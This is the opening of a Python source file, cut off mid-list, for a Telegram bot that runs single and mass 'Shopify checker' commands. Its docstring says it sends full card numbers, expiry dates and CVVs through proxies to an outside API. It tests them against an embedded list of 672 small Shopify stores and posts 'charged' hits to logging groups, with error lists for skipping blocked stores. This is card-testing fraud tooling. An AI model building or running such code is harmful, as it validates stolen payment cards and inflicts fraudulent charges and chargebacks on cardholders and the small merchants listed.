"""
sh.py  v22  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot v21
API       : https://goshopi.up.railway.app/shopii
            GET ?site=DOMAIN&cc=cc|mm|yy|cvv&proxy=ip:port
            proxy = raw ip:port  (NO http:// prefix)

ROOT-CAUSE FIX:
  The API ALWAYS returns HTTP 200. Errors come in the JSON body:
    {"Response": "site error! status: 404"}
  We check the RESPONSE STRING before classify_response.
  "site error! status: 404/403" → blacklist site, zero-sleep skip.
  Raw error strings are NEVER shown to the user (_clean_resp sanitises).

SITES:
  672 sites from sites.txt are embedded directly in BUILTIN_SITES so
  the bot always has them even if the file path is wrong.
  _load_sites() tries sites.txt on disk first; falls back to BUILTIN_SITES.

DM POLICY:
  CHARGED → user DM + HIT_LOG_GROUP_ID + EXTRA_CHARGED_GROUP_ID
  LIVE    → user DM only
  TDS     → user DM only
  DEAD    → nothing

EXPORTS:
  get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
  MSH_SESSIONS, run_mass_batch, create_msh_session
  cb_msh_result, cb_msh_stop, build_result_msg
  _load_sites, _load_proxies
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import json as _json
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID,
    get_bin_info, tg_emoji,
    get_plan_emoji_id, get_random_live_emoji,
    RawMarkup, _btn,
    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
    DEV_EMOJI_ID, PRO_EMOJI_ID,
    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID, PROG_CHARGED_EMOJI_ID,
    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
    LIVE_EMOJI_IDS, PLAN_EMOJIS, SPECIAL_FONT_MAP,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL       = "https://goshopi.up.railway.app/shopii"
BOT_CHANNEL   = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

HIT_LOG_GROUP_ID       = -1004361062205   # edit to your group
EXTRA_CHARGED_GROUP_ID = -1003991915326   # edit to your group

SH_COOLDOWN    = 25
SITE_RETRIES   = 30    # max sites tried per card
SITE_TIMEOUT   = 25    # seconds per API call
MAX_CONCURRENT = 20
BUTTON_LOCK    = 30

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict  = {}
_BIN_CACHE:   dict  = {}
_DEAD_SITES:  set   = set()
_ALL_PROXIES: list  = []

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
LIVE_EMOJI_ID     = "4958610528588008305"
DECLINED_EMOJI_ID = "4956612582816351459"
HIT_GATE_EMOJI_ID = "5341715473882955310"
HIT_RESP_EMOJI_ID = "5839116473951328489"
BTN_LIVE_EMOJI_ID = "5039793437776282663"
BTN_ALL_EMOJI_ID  = "4956324463525233747"
BTN_STOP_EMOJI_ID = "6179444193518162239"

CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 672 SITES FROM sites.txt — embedded so the bot always has them
# _load_sites() tries the file on disk first; falls back here.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BUILTIN_SITES = [
    "q8ffft-xw.myshopify.com",
    "c66f4f-a3.myshopify.com",
    "calaguadesigns.myshopify.com",
    "zenzecosmetics.myshopify.com",
    "hot-price-tubs.myshopify.com",
    "rebrandskincare.com",
    "daf716-82.myshopify.com",
    "salacious-9245.myshopify.com",
    "borba-farms.myshopify.com",
    "bareglowessentials.myshopify.com",
    "shopozzyris.myshopify.com",
    "storeyfamilyfarm.com",
    "ek-photo-design-2.myshopify.com",
    "thedivinecollection-shop.myshopify.com",
    "datcravat.myshopify.com",
    "fresh-kids-clothing.myshopify.com",
    "modaluminosa.myshopify.com",
    "with-love-beckie.myshopify.com",
    "bryson-city-outdoors.myshopify.com",
    "hohtradingpost.myshopify.com",
    "chubby-buttons.myshopify.com",
    "evasonaike.com",
    "tinkermouse.myshopify.com",
    "rose-farmers-t-mobile-tuesdays.myshopify.com",
    "4jzsh6-hb.myshopify.com",
    "lufteknic.myshopify.com",
    "louis-ck.myshopify.com",
    "foundvintagehomeandgifts.myshopify.com",
    "shiftathleisurewear.com",
    "immense-love1434.myshopify.com",
    "creating-the-difference.myshopify.com",
    "saadik-sheikh.myshopify.com",
    "legitgrails.com",
    "scrap-addicts.myshopify.com",
    "truenorthposters.myshopify.com",
    "darngoodyarn.com",
    "s-t-distributor.myshopify.com",
    "lifejoy-5.myshopify.com",
    "eaton-industries-canada.myshopify.com",
    "sasasas-store.myshopify.com",
    "4conly.myshopify.com",
    "centre-for-apologetic-scholarship-education.myshopify.com",
    "ivyshairproducts.myshopify.com",
    "grammyskidscorner.myshopify.com",
    "friends-school-lisburn-shop.myshopify.com",
    "nexamart-3988.myshopify.com",
    "stopcutsave.myshopify.com",
    "madewithhappy.myshopify.com",
    "mj0dzn-yt.myshopify.com",
    "brandnamecontacts.myshopify.com",
    "instapark-inc.myshopify.com",
    "saloncarinashop.myshopify.com",
    "2zhp1n-mz.myshopify.com",
    "rupaul-us.myshopify.com",
    "ultra-challenge-shop.myshopify.com",
    "mitchellsicecream.myshopify.com",
    "richardproductionsllc.myshopify.com",
    "bliss-home-scents.myshopify.com",
    "mutiny-online.myshopify.com",
    "kyndkits.myshopify.com",
    "illustratedmonthly.myshopify.com",
    "bionyoillustrations.com",
    "vespertine-handmade.myshopify.com",
    "chaotic-connections-llc.myshopify.com",
    "value-nest-co.myshopify.com",
    "jjshallc.myshopify.com",
    "mama-lisas-world.myshopify.com",
    "the-voices-6385.myshopify.com",
    "ashleys-sandbox.myshopify.com",
    "dsc-development-store.myshopify.com",
    "homeschoolingtoday.com",
    "donna-b-collection.myshopify.com",
    "wrigleysnook.myshopify.com",
    "gangofour.myshopify.com",
    "outbox0.myshopify.com",
    "artos-adventure.myshopify.com",
    "sweetandsheeky.myshopify.com",
    "the-stadium-bc.myshopify.com",
    "tish-snookys-manic-panic.myshopify.com",
    "fomato.myshopify.com",
    "everydayevancreative.myshopify.com",
    "witch-way-magazine.myshopify.com",
    "look-feel-great.myshopify.com",
    "outdoorx4.myshopify.com",
    "inspiredjewels9.myshopify.com",
    "ellegant-creations-llc.myshopify.com",
    "madebymarsshop.myshopify.com",
    "itsthethought.myshopify.com",
    "cgcinteriors.co.uk",
    "lucky-pet-2.myshopify.com",
    "d2zac0-ws.myshopify.com",
    "leisure-warehouse.myshopify.com",
    "2-peas-and-a-dog.myshopify.com",
    "wilmot-harvey.myshopify.com",
    "advanced-mixology.myshopify.com",
    "clayworx-studio.myshopify.com",
    "keysmart.myshopify.com",
    "store.freezetag.com",
    "gmtsgb-vh.myshopify.com",
    "eternalglows.myshopify.com",
    "serving-orphans.myshopify.com",
    "fd80bf-46.myshopify.com",
    "makeshiftwings.myshopify.com",
    "sizige.myshopify.com",
    "crafty-kylies-facebook-store.myshopify.com",
    "bs5beyondgames.myshopify.com",
    "mysticallurecrystals.myshopify.com",
    "1-call-home-supply.myshopify.com",
    "fdiqnz-pg.myshopify.com",
    "two-bros-bows.myshopify.com",
    "onekind-shop-8178.myshopify.com",
    "31120v-vy.myshopify.com",
    "ti2wq2-nn.myshopify.com",
    "riprightsticks.com",
    "mp3-player-launch.myshopify.com",
    "math-giraffe-shop.myshopify.com",
    "boondockoutdoors.myshopify.com",
    "calibloom-labels.myshopify.com",
    "bluesheepbakeshop.myshopify.com",
    "wiltshire-air-ambulance-online-shop.myshopify.com",
    "ktdkub-ng.myshopify.com",
    "beautbeautyco.com",
    "revive-thredz.myshopify.com",
    "tech-line-direct.myshopify.com",
    "q07w1t-pn.myshopify.com",
    "casey-powell-music.myshopify.com",
    "ezautowrap.myshopify.com",
    "serenity-jewelry-la.myshopify.com",
    "itsneonrushdesigns.myshopify.com",
    "jjheller.myshopify.com",
    "lu-squared-art.myshopify.com",
    "austin-gifts.myshopify.com",
    "gumh04-z9.myshopify.com",
    "max-and-oscar.myshopify.com",
    "irvmfr-ew.myshopify.com",
    "trycloudy.com",
    "threadbird-store.myshopify.com",
    "lifeschoolingshop.com",
    "shopdous.com",
    "snugcity-dev.myshopify.com",
    "meriwetherfarms.com",
    "dobrick-candle-company.myshopify.com",
    "chazdeanstudio.myshopify.com",
    "lyndsey-green-illustration.myshopify.com",
    "uab2eg-0h.myshopify.com",
    "jackery.myshopify.com",
    "janetgwendesigns.myshopify.com",
    "pkdotbiz.myshopify.com",
    "furrion-global.myshopify.com",
    "chicologyinc.myshopify.com",
    "aru-su-online-shop.myshopify.com",
    "downtowncamera-ca.myshopify.com",
    "worshipforkids.com",
    "w0aywt-50.myshopify.com",
    "nw-composite.myshopify.com",
    "arminger.myshopify.com",
    "roseso-sg.myshopify.com",
    "thenewyorkshavingcompany-2.myshopify.com",
    "frankiemae-s.myshopify.com",
    "thac-store.myshopify.com",
    "illuminatingabilitiesmerch.com",
    "stellas-stickers-studio.myshopify.com",
    "cjstickershop.com",
    "www-everydayessentials-store.myshopify.com",
    "acas-electrical.myshopify.com",
    "nordikido.com",
    "63pizt-rg.myshopify.com",
    "patricks-custom-creations.myshopify.com",
    "delaware-riverkeeper-network-river-shop.myshopify.com",
    "simpli-press-coffee.myshopify.com",
    "sigzhp-hr.myshopify.com",
    "flicker-handmadebylisa.myshopify.com",
    "shop-silver-moon.myshopify.com",
    "strawbox.co",
    "ok-fop.myshopify.com",
    "reading-museum-shop.myshopify.com",
    "pettypalacellc.com",
    "forsythfabrics.myshopify.com",
    "snakeriverbrewing.myshopify.com",
    "utsumiamerica.com",
    "imgospark.myshopify.com",
    "aecebf-98.myshopify.com",
    "stiergames.myshopify.com",
    "washfield-wax.myshopify.com",
    "that-vibe-co.myshopify.com",
    "kombat-instruments-limited-2.myshopify.com",
    "novvy-2.myshopify.com",
    "anecdotecandles.com",
    "shop.forthepeople.com",
    "katandgracie.com",
    "spaceiq.myshopify.com",
    "smart-nest-living.myshopify.com",
    "ny-market-4607.myshopify.com",
    "boujeebloomdesignco.myshopify.com",
    "gohypo.myshopify.com",
    "martha-marmalade.myshopify.com",
    "next-level-warriors.myshopify.com",
    "the-lovett-school-campus-store.myshopify.com",
    "brieezyboutique.com",
    "getpressedbysteph.com",
    "printingbypennylane.com",
    "thehistorylist.myshopify.com",
    "pork-king-good.myshopify.com",
    "5350fe.myshopify.com",
    "drummagazinestore.myshopify.com",
    "parker-party-america.myshopify.com",
    "angeldesigns222.myshopify.com",
    "cwwraps.myshopify.com",
    "velo-orange.myshopify.com",
    "checkthefeed-retail-sales.myshopify.com",
    "edccooperative.myshopify.com",
    "groovesolventless.myshopify.com",
    "musk-ox-farm.myshopify.com",
    "scoopandseeco.myshopify.com",
    "flagnorfail.myshopify.com",
    "spearphish-general-store.myshopify.com",
    "mcwilkinson.myshopify.com",
    "cattlewalkdesigns.myshopify.com",
    "prepmymeal-de.myshopify.com",
    "shoptonyg-com.myshopify.com",
    "secretstock-4.myshopify.com",
    "1x23fg-me.myshopify.com",
    "cleaningstore123.myshopify.com",
    "agentnateur.myshopify.com",
    "tiffany-alvords-store.myshopify.com",
    "junkedbygi.myshopify.com",
    "alegree.myshopify.com",
    "wonderland-bakes-by-el.myshopify.com",
    "dreams-and-rainbows.myshopify.com",
    "go-az-promo.myshopify.com",
    "martha-ash.myshopify.com",
    "wms01z-z9.myshopify.com",
    "miniandthrifty.myshopify.com",
    "violettefieldthreads.com",
    "wombatz-skate-supply.myshopify.com",
    "chaos-tribe-customs.myshopify.com",
    "teamiblends-us.myshopify.com",
    "sytspiano.myshopify.com",
    "maewear.com",
    "marks-deli-2.myshopify.com",
    "smrtft.com",
    "s-scentshandmade.myshopify.com",
    "shop-consciously-20.myshopify.com",
    "theadventurechallenge.myshopify.com",
    "yktusx-bv.myshopify.com",
    "bead-dazzled-beads-and-more.myshopify.com",
    "sunflowermotherhood.myshopify.com",
    "graftobian-make-up-company.myshopify.com",
    "one-stop-stationery-supplies.myshopify.com",
    "000091.myshopify.com",
    "motutruckcaps.myshopify.com",
    "chazdean.com",
    "valerias-this-and-that.myshopify.com",
    "butler-supply-group.myshopify.com",
    "altfragrances.myshopify.com",
    "yepoda-test-discount.myshopify.com",
    "dipity-deals.myshopify.com",
    "awaydaysfootball.com",
    "popupsetc.myshopify.com",
    "moonmadedigitals.myshopify.com",
    "designsandslight.myshopify.com",
    "faviana-co.myshopify.com",
    "boxedtrends.myshopify.com",
    "johnstonsupplies.myshopify.com",
    "beastro.myshopify.com",
    "affcf2.myshopify.com",
    "stickerfule.myshopify.com",
    "designs-by-ginny.myshopify.com",
    "freejacnation.com",
    "soch-sails.myshopify.com",
    "ee8417.myshopify.com",
    "zzf8nd-pt.myshopify.com",
    "vrd-retail.myshopify.com",
    "wv-living-collection.myshopify.com",
    "sajaroo-gifts.myshopify.com",
    "jddesigns-graphics.myshopify.com",
    "mike-doughty.myshopify.com",
    "westmarket812.myshopify.com",
    "collectiveminds-uk.myshopify.com",
    "zen-health-foods.myshopify.com",
    "hey-beautiful-nail-supplies.myshopify.com",
    "internationalsheepdogsociety.myshopify.com",
    "ruahine-ports-limited.myshopify.com",
    "murphybeddepot.myshopify.com",
    "destination-yarn.myshopify.com",
    "creativecakery.myshopify.com",
    "kobeesco.com",
    "shop.jnf.org",
    "hakshop.myshopify.com",
    "darlingmamadigitals.myshopify.com",
    "thegreatnorthcoffee.com",
    "tapni.myshopify.com",
    "of-life-lemons.myshopify.com",
    "swiftbuyshop1.myshopify.com",
    "thebiblerecap.myshopify.com",
    "shoplix-9635.myshopify.com",
    "the-four-felted-seasons.myshopify.com",
    "purr-fectly-yours-2.myshopify.com",
    "btr-bar.myshopify.com",
    "garzapodcast.myshopify.com",
    "slowsimpleseasonal.myshopify.com",
    "dinco-d.myshopify.com",
    "rose-farmers.myshopify.com",
    "mirrormatellc.myshopify.com",
    "dbs838.myshopify.com",
    "ecosusi.myshopify.com",
    "thewrightstore-8085.myshopify.com",
    "nmuzyp-jf.myshopify.com",
    "mouthwatchers.myshopify.com",
    "luxe-habit-life.myshopify.com",
    "hellolittlewonderco.myshopify.com",
    "sallywags-ltd.myshopify.com",
    "tri-forged-studios-2.myshopify.com",
    "ecomhub.us",
    "carrot-goods.myshopify.com",
    "kind-cotton.myshopify.com",
    "dealdrift360.myshopify.com",
    "reboxed.co",
    "shesgotpapers.com",
    "sunbelt-mfg-co.myshopify.com",
    "alfiahandmade.myshopify.com",
    "miniijoyco.com",
    "puroshoppe.myshopify.com",
    "subzerofranchise.myshopify.com",
    "coconu.com",
    "staging-cpap.myshopify.com",
    "do-epic-shit-gear.myshopify.com",
    "one-blushing-bride.myshopify.com",
    "gupshupgreetings.com",
    "alma-records.myshopify.com",
    "larepublicasuperfoods.com",
    "strictly-business-motorsports.myshopify.com",
    "3duxdesign.myshopify.com",
    "paulcardall.myshopify.com",
    "toweltextiles.myshopify.com",
    "legacy-creations-8753.myshopify.com",
    "litime-us.myshopify.com",
    "openboosters.myshopify.com",
    "st-johns-episcopal-school-spirit-store.myshopify.com",
    "gec-store.myshopify.com",
    "national-shrine-of-saint-rita-of-cascia.myshopify.com",
    "fahrenheit-press.myshopify.com",
    "fox-island-coins.myshopify.com",
    "a14kk6-yv.myshopify.com",
    "theclearhome.myshopify.com",
    "rk91ah-u6.myshopify.com",
    "river-organics-skincare.myshopify.com",
    "shinespeechactivities.com",
    "stickii-club.myshopify.com",
    "jezebel-gallery.myshopify.com",
    "iseestarsquilting.myshopify.com",
    "emilysstudio24.myshopify.com",
    "dayspring-pens.myshopify.com",
    "dehavillandmuseum.myshopify.com",
    "arwaybags.myshopify.com",
    "cheapfabricsuk.myshopify.com",
    "saxon-london.myshopify.com",
    "black-amber-glam.myshopify.com",
    "coleyhome.com",
    "brooksfashionstore.myshopify.com",
    "work-right-nw.myshopify.com",
    "zap-supplies.myshopify.com",
    "jennys-print-shop.myshopify.com",
    "inclosed-letterpress-co.myshopify.com",
    "beauty-by-earth-natural-beauty.myshopify.com",
    "creative-yarns-inc.myshopify.com",
    "thesoilking.com",
    "peaches.la",
    "ray-boltz-music-inc.myshopify.com",
    "fightstore-pro.myshopify.com",
    "the-pope-store-3.myshopify.com",
    "petalpopcreations.myshopify.com",
    "builtbar.com",
    "wildling-beauty.myshopify.com",
    "meadow-oaks-ranch.myshopify.com",
    "warrior-spot.myshopify.com",
    "dreamlynk.myshopify.com",
    "streeze.myshopify.com",
    "sparksonlinedeals.myshopify.com",
    "goodordering.myshopify.com",
    "rkruru-1v.myshopify.com",
    "blossom-beauty-5116.myshopify.com",
    "stubbypencilstudio.com",
    "lilafoxanime.myshopify.com",
    "counterpop.myshopify.com",
    "shop-paisley-boutique.myshopify.com",
    "cruz3d.myshopify.com",
    "smore-essentials.myshopify.com",
    "parentgiving.myshopify.com",
    "the-modern-classroom-shop.myshopify.com",
    "always-looking-good-uk.myshopify.com",
    "jyerunning.myshopify.com",
    "eno-nation.myshopify.com",
    "0211h0-ei.myshopify.com",
    "weekend-craft.myshopify.com",
    "therezabazar.myshopify.com",
    "evermore-farm.myshopify.com",
    "cadycreations.myshopify.com",
    "goodnightfox.myshopify.com",
    "bluefoxentertainment.store",
    "mysuds2go.com",
    "distributorsofurbanspiritbiblesbooks-gifts.myshopify.com",
    "jtperceptions.myshopify.com",
    "its-in-the-bag.myshopify.com",
    "ayeshaerotica-merch.myshopify.com",
    "082dc6.myshopify.com",
    "3v1r30-km.myshopify.com",
    "sentinel-supply-stickers.myshopify.com",
    "where-wellness-begins.myshopify.com",
    "sagebrushsavvy.myshopify.com",
    "swackie-warehouse.myshopify.com",
    "craftbased-blanks.myshopify.com",
    "caroline-kate.myshopify.com",
    "village-general-store.myshopify.com",
    "bxc5yf-r0.myshopify.com",
    "info-engraving-keys.myshopify.com",
    "jwnuui-vu.myshopify.com",
    "terijocottrell.myshopify.com",
    "dgy4wx-pn.myshopify.com",
    "possumcrafts.myshopify.com",
    "pri-gift-shop.myshopify.com",
    "unpolished-usa.myshopify.com",
    "storyknits.myshopify.com",
    "kingdomcomecards.com",
    "neat-ninjas.myshopify.com",
    "druh-usa.myshopify.com",
    "vicariouslytcg.myshopify.com",
    "dan-joyce-art.myshopify.com",
    "the-green-company-online.myshopify.com",
    "samtec-store.myshopify.com",
    "utomic-design.myshopify.com",
    "beijaflornaturals.myshopify.com",
    "baby-oumulle.myshopify.com",
    "shaggy-waggy-dogs.myshopify.com",
    "moondropbooksllc.myshopify.com",
    "store.thehistorylist.com",
    "thehappylifeplanner.myshopify.com",
    "aerogenics.myshopify.com",
    "cluse-store-dev.myshopify.com",
    "winter-park-products.myshopify.com",
    "a-featherly-touch-by-jenna.myshopify.com",
    "premium-time.myshopify.com",
    "widmerfeeds.myshopify.com",
    "hotrodmusicsource.myshopify.com",
    "mamamadecustoms.myshopify.com",
    "phillips-fastener.myshopify.com",
    "dont-try-it-buy-it.myshopify.com",
    "fwwestside.myshopify.com",
    "dean-accessories.myshopify.com",
    "alcohol-change-uk.myshopify.com",
    "sharynvinci.myshopify.com",
    "kvwkqa-iu.myshopify.com",
    "shop.mamannyc.com",
    "hueysburgers.myshopify.com",
    "dainty-me-2.myshopify.com",
    "nefj6q-yn.myshopify.com",
    "trusted-choice-store.myshopify.com",
    "bosleyproducts.myshopify.com",
    "bridal-extravaganza-show-tickets.myshopify.com",
    "mooala.com",
    "myldmastore.myshopify.com",
    "save-big-depo.myshopify.com",
    "custom-creations-by-reeno.myshopify.com",
    "pet-meadow-texas.myshopify.com",
    "southspoonfarms.myshopify.com",
    "simpleisbestskincare.myshopify.com",
    "everywhereandnowherefanzine.myshopify.com",
    "worship-for-kids.myshopify.com",
    "4rsfqu-yz.myshopify.com",
    "the-inspired-garden.myshopify.com",
    "the-all-american-rejects.myshopify.com",
    "zttgaf-yu.myshopify.com",
    "50-caliber-racing-2.myshopify.com",
    "followyourblissbykasey.myshopify.com",
    "of-bone-earth.myshopify.com",
    "southern-anchor-ky.myshopify.com",
    "angelalynne.myshopify.com",
    "rebel-nell.myshopify.com",
    "uao-merch.myshopify.com",
    "discountinkllc.myshopify.com",
    "riverorganics.org",
    "warrenton-equipment.myshopify.com",
    "rmdcsc-pz.myshopify.com",
    "dgsrbg-1g.myshopify.com",
    "aunt-ems-quilts.myshopify.com",
    "sugarnspiceartworks.myshopify.com",
    "m22.com",
    "simple-bundles-supply.myshopify.com",
    "auxjump.myshopify.com",
    "himibike.myshopify.com",
    "zentimefidget.myshopify.com",
    "independent-vermont-clothing.myshopify.com",
    "traderoutestulsa.myshopify.com",
    "trendinghi.myshopify.com",
    "ninjapoddd.myshopify.com",
    "rcgirl.myshopify.com",
    "pros-diversified.myshopify.com",
    "the-bodyshoppe.myshopify.com",
    "irkpa.org",
    "poor-mans-diesel-com.myshopify.com",
    "khepristees.com",
    "in-defense-of-animals.myshopify.com",
    "csg-unicorner.myshopify.com",
    "ne-student-services.myshopify.com",
    "magnets-by-k2.myshopify.com",
    "mt-joy-merch.myshopify.com",
    "evamalley.com",
    "respire.com",
    "rock-manna.myshopify.com",
    "rnrmcharity.myshopify.com",
    "owlvenice.myshopify.com",
    "artistcolette.myshopify.com",
    "villagebakery1948.myshopify.com",
    "soapsbyamber.myshopify.com",
    "hbiqa.myshopify.com",
    "vigilantecoffeeco.myshopify.com",
    "generation-tee-2.myshopify.com",
    "shop-modernartoxford-org-uk.myshopify.com",
    "brow-zen.myshopify.com",
    "wrinklesschhminkles-usa.myshopify.com",
    "momandpopcorn.myshopify.com",
    "test-rhf.myshopify.com",
    "meraki-baytown.myshopify.com",
    "speedcube.myshopify.com",
    "binspiredstore.myshopify.com",
    "jade-bird-us.myshopify.com",
    "radkut.com",
    "leesaboonedesigns.com",
    "theloopystitch.com",
    "rockcreekmetalcraft.com",
    "01eaiz-g9.myshopify.com",
    "shady-side-academy-store.myshopify.com",
    "eatbobos.myshopify.com",
    "9n0qke-qp.myshopify.com",
    "clarketinwhistle.myshopify.com",
    "urbanbelledesigns.myshopify.com",
    "raynrandy.myshopify.com",
    "nmtcb.myshopify.com",
    "store.mtjoyband.com",
    "the-affordable-general-store.myshopify.com",
    "greenplanetprint.com",
    "numerogroup.com",
    "fc7ed6-bd.myshopify.com",
    "cdbucsshop.myshopify.com",
    "move-to-amend.myshopify.com",
    "commonthread-3.myshopify.com",
    "coastalhazedesigns.myshopify.com",
    "here-comes-the-nerd.myshopify.com",
    "candles-oud.myshopify.com",
    "caveandcanyon.myshopify.com",
    "chavibes.com",
    "4c69a9-d9.myshopify.com",
    "p-louise-cosmetics.myshopify.com",
    "miacreativelab.myshopify.com",
    "kc-needlepoint.myshopify.com",
    "explosions-in-the-sky-us.myshopify.com",
    "jenny-provo.myshopify.com",
    "toolmakermetalworkz-com.myshopify.com",
    "fitness-warehouse.myshopify.com",
    "orangesweetorange.myshopify.com",
    "planterhomawholesale.com",
    "daymondjohn.myshopify.com",
    "shoprcs.myshopify.com",
    "karmaminimart.com",
    "seramerch.com",
    "csa-graphics.myshopify.com",
    "thomas-struts-southern-haberdashery.myshopify.com",
    "lumoraahaven.myshopify.com",
    "api1p5-we.myshopify.com",
    "marie-force.myshopify.com",
    "pr1nts-of-darkness.myshopify.com",
    "wonkyolive.myshopify.com",
    "esmfkn-xa.myshopify.com",
    "whyqrr-xj.myshopify.com",
    "happyplangirlsdesigns.myshopify.com",
    "best-version-4855.myshopify.com",
    "simply-radiant-beauty.myshopify.com",
    "the-hobbit-hole-chatteris.myshopify.com",
    "zi1mv1-20.myshopify.com",
    "mood.design",
    "bazzu-8315.myshopify.com",
    "leahday.com",
    "ux-gear.myshopify.com",
    "spatty-2.myshopify.com",
    "workshopcompanionstore.com",
    "looseassociations.myshopify.com",
    "doubleoutlines.com",
    "penningtonschool.myshopify.com",
    "ollie-bows.myshopify.com",
    "e3yyag-xu.myshopify.com",
    "creative-kathi.myshopify.com",
    "aa3d42-2.myshopify.com",
    "tswmusic.myshopify.com",
    "fhpbng-w5.myshopify.com",
    "planetdds.myshopify.com",
    "bi06ub-iy.myshopify.com",
    "miller-bros-paint.myshopify.com",
    "umt-coaching.myshopify.com",
    "lulufabrics.com",
    "jasonbolandandthestragglers.myshopify.com",
    "20for20-anchor-merchandise.myshopify.com",
    "vela-farms-2585.myshopify.com",
    "cody-kate-boutique.myshopify.com",
    "the-cleaning-hub-ltd.myshopify.com",
    "sdmcvz-jn.myshopify.com",
    "my-maravia.myshopify.com",
    "richmimosadigitalcreations.myshopify.com",
    "blueteesgolf.myshopify.com",
    "shopdoggieworks.myshopify.com",
    "felipaoriginals.myshopify.com",
    "greenway-sustainable-containers.myshopify.com",
    "fqcaiz-ma.myshopify.com",
    "uzfmqh-gr.myshopify.com",
    "janebrookwell.myshopify.com",
    "m3v1gc-jc.myshopify.com",
    "aaronnhall.myshopify.com",
    "bibis94.myshopify.com",
    "airspeedjunkie.myshopify.com",
    "derwent-harps.myshopify.com",
    "apkbridal.myshopify.com",
    "the-epoxy-resin-store.myshopify.com",
    "memorialbakeryhtx.myshopify.com",
    "llamazinglooksco.myshopify.com",
    "threecitycustoms-com.myshopify.com",
    "green-chapter-shop.myshopify.com",
    "bradawheels.myshopify.com",
    "mother-meera-bookstore-usa.myshopify.com",
    "green-mountain-adventure-middlebury-mountaineer.myshopify.com",
    "hgvn01-ex.myshopify.com",
    "maker-valley.myshopify.com",
    "thejnfstore.myshopify.com",
    "themedicallounge.myshopify.com",
    "mastersons-garden-center-inc.myshopify.com",
    "budget-conscious-shopper.myshopify.com",
    "curlsmith.com",
    "thecraftboxuk.myshopify.com",
    "nextgencollect.myshopify.com",
    "inside-stores-2.myshopify.com",
    "glo-brights-wonder-emporium.myshopify.com",
    "jacksonlakewy-store.myshopify.com",
    "mp484e-aa.myshopify.com",
    "storeyfamilyfarm.com",
    "lapf.myshopify.com",
    "vintagepostage.myshopify.com",
    "sweet-p-6471.myshopify.com",
    "alharamain-perfumes.myshopify.com",
    "soapbodega.myshopify.com",
    "shop-plasticplace.myshopify.com",
    "autopints.myshopify.com",
    "vegnews.myshopify.com",
    "kripsy-kat.myshopify.com",
    "lit3456.myshopify.com",
    "the-childrens-school-atl.myshopify.com",
    "turquoise-gem-textiles.myshopify.com",
    "darkenergy.com",
    "simplygoodhl.myshopify.com",
    "organized-chaos-hq.myshopify.com",
    "ysolda.com",
    "10wzei-2a.myshopify.com",
    "guardian-bleeding-control.myshopify.com",
    "renardhomestore.myshopify.com",
    "bethanyjoyart.com",
    "louisianatrophies.com",
    "rockin-c-silver-co.myshopify.com",
    "dev-cmt.myshopify.com",
    "built-bar.myshopify.com",
    "xwpfns-et.myshopify.com",
    "elmos3d-2.myshopify.com",
    "shadow-fashion-clothing.myshopify.com",
    "6815ir-tv.myshopify.com",
    "j-j-general-goods.myshopify.com",
    "rutland-tile-stone.myshopify.com"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE SIGNAL SETS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# These mean the site is PERMANENTLY unsupported — blacklist it, zero-sleep skip
_DEAD_SITE_SIGNALS = (
    "site error! status: 404",
    "site error! status: 403",
    "not shopify!",
    "site not supported for now!",
    "site not supported",
    "application not found",
    "app not found",
    "store not found",
    "site requires login!",
)

# These mean a transient failure — try another site (short sleep)
_RETRY_SIGNALS = (
    "site error! status: 500",
    "site error! status: 429",
    "site error! status: 502",
    "site error! status: 503",
    "site error! status: 504",
    "http error",
    "timeout",
    "connection error",
    "proxy error",
    "r4 token empty",
    "r2 id empty",
    "product not found",
    "hcaptcha detected",
    "hcaptcha_detected",
    "tax ammount empty",
    "del ammount empty",
    "product id is empty",
    "clinte token",
    "failed to get token",
    "no valid products",
    "no available products found",
    "validation_custom",
    "error processing card",
    "delivery_zone_not_found",
    "delivery_no_delivery_strategy_available",
    "delivery_delivery_line_detail_changed",
    "delivery_strategy_conditions_not_satisfied",
    "delivery_no_delivery_strategy_available_for_merchandise_line",
    "session_error",
    "token not found",
    "invalid_response",
    "curl error",
    "payments_credit_card_brand_not_supported",
    "buyer_identity_currency_not_supported_by_shop",
    "could not resolve host",
    "connect tunnel failed",
    "receipt_empty",
    "could not extract receiptid",
    "receiptid missing",
    "response missing receiptid",
    "could not extract signedhandles",
    "extract signedhandles",
